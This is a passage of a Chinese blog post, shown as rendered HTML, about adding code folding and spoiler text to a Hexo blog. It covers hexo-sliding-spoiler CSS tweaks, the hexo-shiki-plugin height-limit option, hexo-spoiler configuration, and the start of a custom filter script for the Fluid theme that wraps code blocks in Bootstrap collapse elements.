style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Hello, world!"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Hello, world!"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Hello, world!"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Hello, world!"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Hello, world!"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Hello, world!"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Hello, world!"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Hello, world!"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Hello, world!"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Hello, world!"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Hello, world!"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Hello, world!"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Hello, world!"</span><span style="color: #D4D4D4">);</span></span></code></pre></div></div></figure>    </div></div><p>直接使用的话，会发现代码块和 spoiler 区域有间距，而且标题也是默认白色，如果想要修改的话，可以找到 <code>node_modules\hexo-sliding-spoiler\assets\spoiler.css</code> 进行修改。我的修改如下：</p><figure class="shiki css"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D7BA7D">.spoiler</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">margin</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">border</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1px</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">solid</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">#353535</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">border-radius</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">3px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">position</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">relative</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">clear</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">both</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D7BA7D">.spoiler</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">.spoiler-title</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">background</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#303030</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">margin</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">5px</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">15px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#d6d6d6</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">font-weight</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">bold</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">13px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">block</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">cursor</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">pointer</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D7BA7D">.spoiler</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">.spoiler-title:before</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">font-weight</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">bold</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D7BA7D">.spoiler.collapsed</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">.spoiler-title:before</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">content</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"Show "</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D7BA7D">.spoiler.expanded</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">.spoiler-title:before</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">content</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"Hide "</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D7BA7D">.spoiler</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">.spoiler-content</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">margin-bottom</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">-moz-transition-duration</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0.3s</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">-webkit-transition-duration</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0.3s</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">-o-transition-duration</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0.3s</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">transition-duration</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0.3s</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">-moz-transition-timing-function</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">ease-in-out</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">-webkit-transition-timing-function</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">ease-in-out</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">-o-transition-timing-function</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">ease-in-out</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">transition-timing-function</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">ease-in-out</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #D7BA7D">.spoiler</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">.spoiler-content</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">figure</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">margin</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #D7BA7D">.spoiler.collapsed</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">.spoiler-content</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">overflow</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">auto</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">max-height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D7BA7D">.spoiler.expanded</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">.spoiler-content</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">max-height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">3000px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">overflow</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">auto</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D7BA7D">.spoiler</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">.spoiler-content</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">p:first-child</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">margin-top</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">!important</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><p>但还是不太完美，自由度不是很够，也可能是我不太会修改吧。</p><h2 id="更换代码高亮渲染器实现代码折叠目前使用的方案"><a class="markdownIt-Anchor" href="#更换代码高亮渲染器实现代码折叠目前使用的方案"></a> 更换代码高亮渲染器实现代码折叠（目前使用的方案）</h2><p>将渲染器更换为 <a href="https://github.com/nova1751/hexo-shiki-plugin">Hexo Shiki Plugin</a></p><p>实际上我并不知道该插件可以实现代码折叠，而是在配置该插件时发现的代码折叠功能，该功能在插件内实际是 <code>highlight_height_limit</code> 项，代码超出此项设定的高度则自动折叠。</p><div class="note warning flat"><p>⚠️注意：</p><p>该插件在代码类型的处理上存在 bug，详见：<a href="https://github.com/nova1751/hexo-shiki-plugin/issues/5">issue</a></p><p>解决办法是所有代码类型以后只写小写。</p></div><h2 id="hexo-spoiler实现文字遮盖"><a class="markdownIt-Anchor" href="#hexo-spoiler实现文字遮盖"></a> hexo-spoiler 实现文字遮盖</h2><p><code>hexo-sliding-spoiler</code> 是受 <code>hexo-spoiler</code> 插件的启发而成的。<code>hexo-spoiler</code> 同样可以帮助你做到文字遮挡效果：</p><p>在线演示：<a href="http://htmlpreview.github.io/?https://github.com/unnamed42/hexo-spoiler/blob/master/example/index.html">http://htmlpreview.github.io/?https://github.com/unnamed42/hexo-spoiler/blob/master/example/index.html</a></p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411022016966.gif" alt="recording"></p><p>安装命令</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">npm</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">install</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">hexo-spoiler</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">--save</span></span></code></pre></div></div></figure><p>和上面的插件一样，如果没有起作用可能是配置文件得配置一下</p><figure class="shiki yaml"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">plugins</span><span style="color: #D4D4D4">:</span></span><span class="line"><span style="color: #D4D4D4"> - </span><span style="color: #CE9178">hexo-spoiler</span></span></code></pre></div></div></figure><p>语法</p><figure class="shiki markdown"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">{% spoiler option:value text... %}</span></span></code></pre></div></div></figure><p>option:value 中的 value 为可配置选项：</p><table><thead><tr><th>Optionname 选项名</th><th> Type 类型</th><th> value 值</th><th> Effect 效果</th></tr></thead><tbody><tr><td>style</td><td> string</td><td>blur or box</td><td> 文本将被模糊处理或是被方框覆盖</td></tr><tr><td> color</td><td>string</td><td>All valid css color<br><strong>NO</strong> spaces allowed for inline option!</td><td> 仅在 style:box 时起作用；更改框的颜色。默认颜色为<code>黑色</code>。（不允许内联选项中存在空格）</td></tr><tr><td>p</td><td><code>boolean</code>(in <code>_config.yml</code> or front-matter)<br><code>string</code>(in inline options)</td><td>empty or any string</td><td> 遮盖文字将因 &lt;p&gt; 标签换行而非 &lt; span &gt; 标签。如果你想在剧透文本前后加一个新行，可以添加这个。<br>对于内联选项，分配任何值（除了 <code>“false”</code>），甚至忽略它会打开它；<code>“false”</code> 意味着关闭。默认状态为关闭。</td></tr></tbody></table><p>这表的配置项都在<code>_config.yml</code> 中进行配置，例如：</p><figure class="shiki yaml"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955"># ... other configs</span></span><span class="line"><span style="color: #6A9955"># be top-level</span></span><span class="line"><span style="color: #569CD6">spoiler</span><span style="color: #D4D4D4">:</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">style</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">blur</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">p</span><span style="color: #D4D4D4">: </span><span style="color: #569CD6">true</span></span></code></pre></div></div></figure><p>对于单独的一篇文章，你可以在文章的 front-matter 中设置，例如：</p><figure class="shiki markdown"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">---</span></span><span class="line"><span style="color: #569CD6">title</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">blah blah</span></span><span class="line"><span style="color: #569CD6">spoiler</span><span style="color: #D4D4D4">:</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">style</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">box</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">yellow</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">p</span><span style="color: #D4D4D4">: </span><span style="color: #569CD6">false</span></span><span class="line"><span style="color: #D4D4D4">---</span></span></code></pre></div></div></figure><p>优先级：inline option 内联选项 &gt; front-matter &gt; _config.yml &gt; default</p><div class="note warning flat"><p>warning</p><p>如果你改变了<code>_config.yml</code>，请运行 <code>hexo clean</code> 清除缓存。</p></div><h2 id="hexo过滤器实现代码折叠若不更换高亮渲染则推荐这个"><a class="markdownIt-Anchor" href="#hexo过滤器实现代码折叠若不更换高亮渲染则推荐这个"></a> Hexo 过滤器实现代码折叠（若不更换高亮渲染则推荐这个）</h2><div class="note info flat"><p><code>Kiyan</code> 佬的文章启发了我，于是我自行钻研了一下才有了这一段。这一段内容实际是我后来才加上的，所以放在了这里，文章顺序有点奇怪见谅。</p><ul><li><a href="https://kiyanyang.github.io/posts/c4dd4019/">使用 Hexo 过滤器实现代码折叠 By Kiyan</a></li></ul></div><h3 id="编写js"><a class="markdownIt-Anchor" href="#编写js"></a> 编写 js</h3><p>由于 fluid 主题已经引入了 Bootstrap，所以我们可以编写一个 js 文件来满足我们的要求。</p><p>在 <code>scripts</code> 目录下创建 <code>codeFloding.js</code>：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// 获取唯一 ID</span></span><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getUuid</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 生成一个随机的唯一标识符，由当前时间戳和随机数拼接而成</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">Math</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">random</span><span style="color: #D4D4D4">().</span><span style="color: #DCDCAA">toString</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">36</span><span style="color: #D4D4D4">).</span><span style="color: #DCDCAA">substring</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">2</span><span style="color: #D4D4D4">, </span><span style="color: #B5CEA8">8</span><span style="color: #D4D4D4">) + </span><span style="color: #9CDCFE">Date</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">now</span><span style="color: #D4D4D4">().</span><span style="color: #DCDCAA">toString</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">36</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 注册 Hexo 的过滤器，在文章渲染后处理代码块</span></span><span class="line"><span style="color: #9CDCFE">hexo</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">extend</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">filter</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">register</span><span style="color: #D4D4D4">(</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #CE9178">"after_post_render"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  (</span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 获取代码高亮设置</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> { </span><span style="color: #4FC1FF">line_number</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">lib</span><span style="color: #D4D4D4"> } = </span><span style="color: #9CDCFE">hexo</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">theme</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">config</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">code</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">highlight</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">let</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">reg</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 根据使用的高亮库设置正则表达式</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">lib</span><span style="color: #D4D4D4"> === </span><span style="color: #CE9178">"highlightjs"</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">line_number</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">reg</span><span style="color: #D4D4D4"> = </span><span style="color: #D16969">/</span><span style="color: #CE9178">(</span><span style="color: #D16969">&lt;figure class="highlight.</span><span style="color: #D7BA7D">+?</span><span style="color: #D16969">&gt;</span><span style="color: #CE9178">)(</span><span style="color: #D16969">.</span><span style="color: #D7BA7D">+?</span><span style="color: #D16969">hljs </span><span style="color: #CE9178">(</span><span style="color: #D16969">.</span><span style="color: #D7BA7D">*?</span><span style="color: #CE9178">)</span><span style="color: #D16969">".</span><span style="color: #D7BA7D">+?</span><span style="color: #CE9178">)(</span><span style="color: #D16969">&lt;</span><span style="color: #D7BA7D">\/</span><span style="color: #D16969">figure&gt;</span><span style="color: #CE9178">)</span><span style="color: #D16969">/</span><span style="color: #569CD6">gims</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 处理包含行号的 figure</span></span><span class="line"><span style="color: #D4D4D4">      } </span><span style="color: #C586C0">else</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">reg</span><span style="color: #D4D4D4"> = </span><span style="color: #D16969">/</span><span style="color: #CE9178">(</span><span style="color: #D16969">&lt;div class="code-wrapper.</span><span style="color: #D7BA7D">+?</span><span style="color: #D16969">&gt;</span><span style="color: #CE9178">)(</span><span style="color: #D16969">.</span><span style="color: #D7BA7D">+?</span><span style="color: #D16969">hljs </span><span style="color: #CE9178">(</span><span style="color: #D16969">.</span><span style="color: #D7BA7D">*?</span><span style="color: #CE9178">)</span><span style="color: #D16969">".</span><span style="color: #D7BA7D">+?</span><span style="color: #CE9178">)(</span><span style="color: #D16969">&lt;</span><span style="color: #D7BA7D">\/</span><span style="color: #D16969">div&gt;</span><span style="color: #CE9178">)</span><span style="color: #D16969">/</span><span style="color: #569CD6">gims</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 处理不包含行号的 div</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">    } </span><span style="color: #C586C0">else</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">lib</span><span style="color: #D4D4D4"> === </span><span style="color: #CE9178">"prismjs"</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">reg</span><span style="color: #D4D4D4"> = </span><span style="color: #D16969">/</span><span style="color: #CE9178">(</span><span style="color: #D16969">&lt;div class="code-wrapper.</span><span style="color: #D7BA7D">+?</span><span style="color: #D16969">&gt;</span><span style="color: #CE9178">)(</span><span style="color: #D16969">.</span><span style="color: #D7BA7D">+?</span><span style="color: #D16969">data-language="</span><span style="color: #CE9178">(</span><span style="color: #D16969">.</span><span style="color: #D7BA7D">*?</span><span style="color: #CE9178">)</span><span style="color: #D16969">".</span><span style="color: #D7BA7D">+?</span><span style="color: #CE9178">)(</span><span style="color: #D16969">&lt;</span><span style="color: #D7BA7D">\/</span><span style="color: #D16969">div&gt;</span><span style="color: #CE9178">)</span><span style="color: #D16969">/</span><span style="color: #569CD6">gims</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 处理 PrismJS 的代码块</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// match begin inner lang end offset string 分别表示的意思是：匹配到的内容的开始、内容、语言、结束、偏移量、原始字符串</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">content</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">content</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">replace</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">reg</span><span style="color: #D4D4D4">, (</span><span style="color: #9CDCFE">match</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">begin</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">inner</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">lang</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">end</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">offset</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">string</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">collapseId</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">`collapse-</span><span style="color: #569CD6">${</span><span style="color: #DCDCAA">getUuid</span><span style="color: #D4D4D4">()</span><span style="color: #569CD6">}</span><span style="color: #CE9178">`</span><span style="color: #D4D4D4">; </span><span style="color: 